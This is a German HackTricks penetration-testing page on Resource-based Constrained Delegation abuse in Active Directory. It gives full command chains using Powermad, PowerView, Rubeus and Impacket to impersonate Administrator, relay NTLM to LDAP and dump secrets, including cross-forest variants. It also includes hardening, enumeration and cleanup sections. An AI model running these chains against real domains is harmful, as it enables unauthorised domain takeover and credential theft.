# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen von Resource-based Constrained Delegation

Dies ähnelt der grundlegenden [Constrained Delegation](constrained-delegation.md), aber **anstatt** einem **Objekt** Berechtigungen zu geben, sich gegenüber einem Computer als **beliebiger Benutzer auszugeben**, **legt** Resource-based Constrained Delegation **in dem Objekt fest, wer sich ihm gegenüber als beliebiger Benutzer ausgeben kann**.

In diesem Fall besitzt das eingeschränkte Objekt ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ mit dem Namen des Benutzers, der sich ihm gegenüber als jeder andere Benutzer ausgeben kann.

Ein weiterer wichtiger Unterschied zwischen dieser Constrained Delegation und den anderen Delegationsarten besteht darin, dass jeder Benutzer mit **Schreibberechtigungen über ein Computerkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **_msDS-AllowedToActOnBehalfOfOtherIdentity_** setzen kann. (Bei den anderen Delegationsformen benötigte man Domain-Admin-Rechte.)

### Neue Konzepte

Bei der Constrained Delegation wurde erklärt, dass das Flag **`TrustedToAuthForDelegation`** innerhalb des _userAccountControl_-Werts des Benutzers erforderlich ist, um ein **S4U2Self** durchzuführen. Das ist jedoch nicht vollständig korrekt.\
Tatsächlich kannst du auch ohne diesen Wert ein **S4U2Self** gegenüber jedem Benutzer durchführen, wenn du ein **Service** bist (über einen SPN verfügst). Wenn du jedoch **`TrustedToAuthForDelegation`** besitzt, ist das zurückgegebene TGS **Forwardable**. Wenn du dieses Flag **nicht** besitzt, ist das zurückgegebene TGS **nicht** **Forwardable**.

Wenn das beim **S4U2Proxy** verwendete **TGS** **NICHT Forwardable** ist, funktioniert der Versuch, eine **grundlegende Constrained Delegation** zu missbrauchen, **nicht**. Wenn du jedoch versuchst, eine **Resource-Based Constrained Delegation** auszunutzen, funktioniert es.

### Angriffsstruktur

> Wenn du **Schreibäquivalenz-Berechtigungen** über ein **Computer**-Konto besitzt, kannst du **privilegierten Zugriff** auf diesen Computer erlangen.

Angenommen, der Angreifer besitzt bereits **Schreibäquivalenz-Berechtigungen über den Opfercomputer**.

1. Der Angreifer **kompromittiert** ein Konto, das über einen **SPN** verfügt, oder **erstellt eines** („Service A“). Beachte, dass jeder _Admin User_ ohne weitere besondere Berechtigungen bis zu 10 Computerobjekte (**_MachineAccountQuota_**) **erstellen** und für diese einen **SPN** setzen kann. Der Angreifer kann also einfach ein Computerobjekt erstellen und einen SPN setzen.
2. Der Angreifer **missbraucht seine WRITE-Berechtigung** über den Opfercomputer (ServiceB), um Resource-based Constrained Delegation so zu konfigurieren, dass ServiceA sich gegenüber diesem Opfercomputer (ServiceB) als beliebiger Benutzer ausgeben kann.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
1. S4U2Self (vom kompromittierten/erstellten Konto mit SPN): Fordere ein **TGS von Administrator an mich** an (nicht Forwardable).
2. S4U2Proxy: Verwende das **nicht Forwardable TGS** aus dem vorherigen Schritt, um ein **TGS** von **Administrator** zum **Opferhost** anzufordern.
3. Auch wenn du ein nicht Forwardable TGS verwendest, wird es funktionieren, da du Resource-based Constrained Delegation ausnutzt.
4. Der Angreifer kann **pass-the-ticket** verwenden und sich als der Benutzer ausgeben, um **Zugriff auf den Opfer-ServiceB** zu erlangen.

Um die _**MachineAccountQuota**_ der Domain zu überprüfen, kannst du Folgendes verwenden:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Du kannst mithilfe von **[powermad](https://github.com/Kevin-Robertson/Powermad)** ein Computerobjekt innerhalb der Domäne erstellen:
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren von Resource-based Constrained Delegation

**Verwendung des activedirectory PowerShell-Moduls**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Verwendung von PowerView**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführen eines vollständigen S4U-Angriffs (Windows/Rubeus)

Zuerst haben wir das neue Computer-Objekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies gibt die RC4- und AES-Hashes für dieses Konto aus.\
Nun kann der Angriff durchgeführt werden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können weitere Tickets für weitere Dienste generieren, indem Sie mit dem Parameter `/altservice` von Rubeus nur einmal danach fragen:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Beachte, dass Benutzer ein Attribut namens "**Cannot be delegated**" besitzen. Wenn dieses Attribut für einen Benutzer auf True gesetzt ist, kannst du dich nicht als dieser Benutzer ausgeben. Diese Eigenschaft ist in BloodHound sichtbar.

### Linux-Tools: durchgängiges RBCD mit Impacket (2024+)

Wenn du unter Linux arbeitest, kannst du die vollständige RBCD-Kette mit den offiziellen Impacket-Tools durchführen:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Hinweise
- Wenn LDAP signing/LDAPS erzwungen wird, verwende `impacket-rbcd -use-ldaps ...`.
- Bevorzuge AES keys; viele moderne Domains beschränken RC4. Impacket und Rubeus unterstützen beide AES-only flows.
- Impacket kann für einige Tools den `sname` ("AnySPN") umschreiben, aber ermittle nach Möglichkeit den korrekten SPN (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Domainübergreifendes und forestübergreifendes RBCD

Wenn der **delegating principal**, den du kontrollierst, in einer **anderen Domain** (oder sogar einem **anderen Forest**) als der **resource computer** lebt, handelt es sich weiterhin um **RBCD**. Der Ticket flow entspricht jedoch nicht mehr dem üblichen `S4U2Self -> S4U2Proxy` innerhalb einer einzelnen Domain.

### Domainübergreifendes RBCD: den foreign principal per SID konfigurieren

Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domain** setzt, kann der foreign machine/user im LDAP der Zieldomain möglicherweise **nicht anhand seines Namens aufgelöst werden**. Konfiguriere in diesem Fall den Delegationseintrag mithilfe der **SID** des foreign principal anstelle seines sAMAccountName/UPN.

Dies ist besonders relevant, wenn du NTLM mit `ntlmrelayx.py` an LDAP weiterleitest:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Hinweise:
- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Dies ist erforderlich, wenn das delegierende Konto aus einer anderen Domain als der Zieldomain stammt.
- Selbst wenn das Tool `User not found in LDAP` ausgibt, kann der Delegation-Schreibvorgang trotzdem erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.

### Domänenübergreifendes RBCD: Cross-Realm-S4U-Sequenz

Sobald der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` enthalten ist, funktioniert der domänenübergreifende Ablauf wie folgt:

1. Einen **TGT** für den delegierenden Principal aus seiner eigenen Domain erhalten.
2. Einen **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
3. Eine **Cross-Realm-S4U2Self-Referral** für den zu impersonierenden Benutzer beim Domain Controller der Zieldomain anfordern.
4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer wieder in der delegierenden Domain anfordern.
5. **S4U2Proxy** in der delegierenden Domain durchführen, um ein Referral-Ticket für die Zieldomain zu erhalten.
6. Das abschließende **S4U2Proxy** auf dem Domain Controller der Zieldomain durchführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.

Dies ist der Grund, warum Standard-Linux-Tools bei domänenübergreifendem RBCD häufig fehlschlagen:
- Die **Realm** der Anfrage muss möglicherweise von der Realm des im `TGS-REQ` verwendeten TGT abweichen.
- Die Kette benötigt **unabhängige S4U2Proxy-Schritte**, nicht nur `S4U2Self` oder `S4U2Self`, das unmittelbar von einem einzelnen `S4U2Proxy` gefolgt wird.

### Domänenübergreifendes RBCD unter Linux

Synacktiv hat eine Impacket-Implementierung von `getST.py` veröffentlicht, die die Cross-Realm-Sequenz unter Linux reproduziert, indem sie die beiden KDCs explizit behandelt:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operativ lauten die neuen Argumente:
- `-dc-ip`: DC der **delegierenden** Domain
- `-targetdomain`: Domain des **Ressourcencomputers**
- `-targetdc`: DC der **Ressourcen**-Domain

### Einschränkungen von Forest-übergreifendem RBCD

Forest-übergreifendes RBCD hat eine wichtige Einschränkung: **Der impersonierte Benutzer muss demselben Forest wie der delegierende Principal angehören**. Wenn sich dein kontrolliertes Maschinenkonto in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du im Allgemeinen **keine beliebigen `asgard.local`-Benutzer** über RBCD gegenüber dieser Ressource impersonieren.

Es ist weiterhin ausnutzbar, wenn:
- der Benutzer aus dem **delegierenden Forest** ein **lokaler Administrator** (oder anderweitig privilegiert) auf dem Ressourcenhost im anderen Forest ist
- ein Trust den erforderlichen Authentifizierungspfad erlaubt und die fremde SID im Sicherheitsdeskriptor des Zielcomputers akzeptiert wird

### Protokollbesonderheiten von Forest-übergreifendem RBCD

Forest-übergreifendes RBCD ist nicht einfach „Cross-Domain plus ein Trust“. Der beobachtete Ablauf beinhaltet zwei Besonderheiten, die von gängigen Tools historisch oft nicht berücksichtigt werden:

1. Eine zusätzliche **S4U2Proxy**-Anfrage, die `PA-PAC-OPTIONS=branch-aware` setzt
2. Ein finales Service-Ticket, das möglicherweise über **RC4** zurückgegeben wird, selbst wenn andere Etypes angefordert wurden

Der praktische Ablauf ist:

1. Einen TGT für den delegierenden Principal in Forest A erhalten.
2. **S4U2Self** für den impersonierten Benutzer in Forest A anfordern.
3. **S4U2Proxy** in Forest A anfordern, um ein Referral-TGT für Forest B zu erhalten.
4. Ein zweites **S4U2Proxy** in Forest A **ohne das S4U2Self-Ticket als zusätzliches Ticket**, jedoch mit aktiviertem `branch-aware`, senden, um ein weiteres Referral-TGT für Forest B zu erhalten.
5. Optional ein normales Service-Ticket in Forest B für den delegierenden Principal anfordern (dieses Ticket ist für den finalen Abuse nicht erforderlich).
6. Die Referral-Tickets aus den Schritten 3 und 4 verwenden, um das finale **S4U2Proxy**-Ticket in Forest B für den impersonierten Forest-A-Benutzer gegenüber dem Ziel-SPN anzufordern.

### Forest-übergreifendes RBCD von Linux aus

Der gleiche Synacktiv-Impacket-Branch fügt für diese Logik einen `-forest`-Switch hinzu:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekursives Multi-Domain-RBCD (3+ Domänen)

In **Forests mit mehreren Domänen** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, anstatt nach einer Weiterleitung zu stoppen:

- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domäne des imitierten Benutzers** gesendet. Dazwischenliegende übergeordnete/untergeordnete Domänen werden mit normalen `TGS-REQ`-Weiterleitungen für `krbtgt/<REALM>` durchlaufen, und das **abschließende `S4U2Self`** wird in der **eigenen Domäne des delegierenden Principals** gesendet.
- Das bedeutet, dass bereits der **Besitz eines TGTs** für ein Computerkonto ausreichen kann, um einen **Admin aus einer anderen Domäne im selben Forest** zu imitieren und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
- **Rekursives S4U2Proxy** folgt der Trust-Kette auf dieselbe Weise: Bei den Zwischenstationen wird das vorherige Ticket erneut als TGT verwendet, während die nächste `krbtgt/<REALM>`-Weiterleitung angefordert wird. Erst der letzte Hop gibt das endgültige Service-Ticket zurück.

Ein praktisches Beispiel innerhalb desselben Forests ist:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less Cross-Domain / Cross-Forest RBCD

Wenn das **delegierende Principal ein Benutzer ohne SPN** ist, schlägt das letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Der Workaround besteht darin, **nur den letzten Hop als `S4U2Self+U2U`** zu wiederholen.

Kurzfassung der Angriffskette:

1. Mit dem **NT-Hash** authentifizieren, damit der KDC zu **RC4-HMAC (Etype 23)** gelenkt wird.
2. Zuerst **`-self -u2u`** anfordern und dieses Ticket getrennt vom späteren Proxy-Schritt aufbewahren.
3. Den **TGT-Sitzungsschlüssel** mit `describeTicket.py` extrahieren.
4. Den **NT-Hash** des Benutzers durch diesen **Sitzungsschlüssel** ersetzen, indem `changepasswd.py -newhashes <session_key>` verwendet wird.
5. Das `S4U2Self+U2U`-Ticket bei einer separaten **`-proxy`**-Anfrage erneut als **`-additional-ticket`** verwenden.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Betriebliche Hinweise:

- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, bevorzugt den **branch-aware**-Algorithmus (`getST.py ... -forest`), um das native Verhalten von Windows abzubilden. Wenn die fremde Forest erst **später** in der Kette erreicht wird, kann der nicht branch-aware rekursive Ablauf weiterhin funktionieren.
- Auf aktuellen **Windows Server 2022/2025**-DCs kann erzwungenes RC4 mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen, da RC4 veraltet ist. Dadurch kann **SPN-less RBCD** unmöglich werden, obwohl klassisches SPN-basiertes RBCD weiterhin mit AES funktioniert.
- Führt **`S4U2Self+U2U` vor der Änderung des Hashes/Passworts des Benutzers** aus: `SamrChangePasswordUser` berechnet die Kerberos-AES-Schlüssel des Kontos **nicht** neu. Wird das Passwort zuerst geändert, können spätere Ticket-Anfragen fehlschlagen.
- Das impersonifizierte Konto muss weiterhin **delegierbar** sein: **Protected Users** sowie Konten mit **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blockieren die Kette.

## Hinweise zur Erkennung / Härtung

- RBCD-Pfade über Domänen/Forests hinweg werden weiterhin meist durch **ACL abuse** oder **relay-to-LDAP** erstellt. Erzwingt **LDAP signing** und **LDAP channel binding** auf DCs, um gängige Setup-Pfade zu unterbrechen.
- Prüft, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` auf Computerobjekten schreiben kann, und löst die gespeicherten SIDs auf, einschließlich **foreign security principals**.
- Prüft in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** sowie, ob Benutzer aus einer fremden Forest über **local admin**-Rechte auf Ressourcenhosts verfügen.

### Zugreifen

Die letzte Befehlszeile führt den **vollständigen S4U-Angriff aus und injiziert den TGS** von Administrator in den **Speicher** des Opferhosts.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst von Administrator angefordert, sodass ihr auf **C$** zugreifen könnt:
```bash
ls \\victim.domain.local\C$
```
### Verschiedene Service-Tickets missbrauchen

Erfahre [**hier mehr über die verfügbaren Service-Tickets**](silver-ticket.md#available-services).

## Aufzählung, Überprüfung und Bereinigung

### Computer mit konfiguriertem RBCD auflisten

PowerShell (Dekodierung der SD zur Auflösung der SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (mit einem Befehl lesen oder leeren):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash angibst. Übergib Rubeus mindestens den AES256-Hash (oder einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** während `-self` für einen normalen Benutzer: Der delegierende Principal hat wahrscheinlich **keinen SPN**. Wiederhole den **letzten Hop** als **`S4U2Self+U2U`** anstelle eines regulären **`S4U2Self`**.
- **`KDC_ERR_ETYPE_NOSUPP`** während **SPN-less RBCD**: Neuere DCs lehnen möglicherweise den erzwungenen **RC4-HMAC**-Pfad ab, der für den Trick **`S4U2Self+U2U`** + Session-Key-Substitution erforderlich ist. Versuche stattdessen einen klassischen **SPN-backed**-RBCD-Pfad mit AES.
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und kerberos nicht ordnungsgemäß funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes für die Anmeldung nicht funktionieren. Möglicherweise hast du vergessen, beim Generieren der Hashes das `$` in den Benutzernamen einzufügen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- **`KDC_ERR_BADOPTION`**: Dies kann Folgendes bedeuten:
- Der Benutzer, den du impersonieren möchtest, kann nicht auf den gewünschten Service zugreifen (weil du ihn nicht impersonieren darfst oder weil er nicht über ausreichende Berechtigungen verfügt).
- Der angeforderte Service existiert nicht (wenn du beispielsweise ein Ticket für WinRM anforderst, WinRM aber nicht ausgeführt wird).
- Der erstellte Fakecomputer hat seine Berechtigungen auf dem verwundbaren Server verloren, und du musst sie ihm erneut gewähren.
- Du missbrauchst klassisches KCD; beachte, dass RBCD mit nicht weiterleitbaren S4U2Self-Tickets funktioniert, während KCD weiterleitbare Tickets benötigt.

## Hinweise, Relays und Alternativen

- Du kannst die RBCD-SD auch über AD Web Services (ADWS) schreiben, wenn LDAP gefiltert wird. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt lokalen SYSTEM-Zugriff zu erlangen. Siehe praktische End-to-End-Beispiele:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Wenn LDAP signing/channel binding **deaktiviert** sind und du ein Machine Account erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP weiterleiten, `msDS-AllowedToActOnBehalfOfOtherIdentity` für deinen Machine Account am Zielcomputerobjekt setzen und anschließend **Administrator** über S4U von außerhalb des Hosts impersonieren.

## Referenzen

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (offiziell): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Kurzes Linux-Cheatsheet mit aktueller Syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
